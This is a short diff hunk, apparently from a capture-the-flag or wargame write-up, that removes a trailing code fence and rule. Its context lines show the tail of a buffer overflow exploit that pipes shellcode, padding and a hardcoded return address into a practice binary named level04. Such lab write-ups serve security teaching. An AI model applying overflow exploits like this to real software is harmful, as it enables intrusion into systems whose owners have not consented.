@@ -122,8 +122,3 @@ ret     = "\xa0\xd6\xff\xff"
 sys.stdout.write(shellcode + padding + ret)
 EOF
 python /tmp/exploit.py | ./level04
-```
-
-
----
-
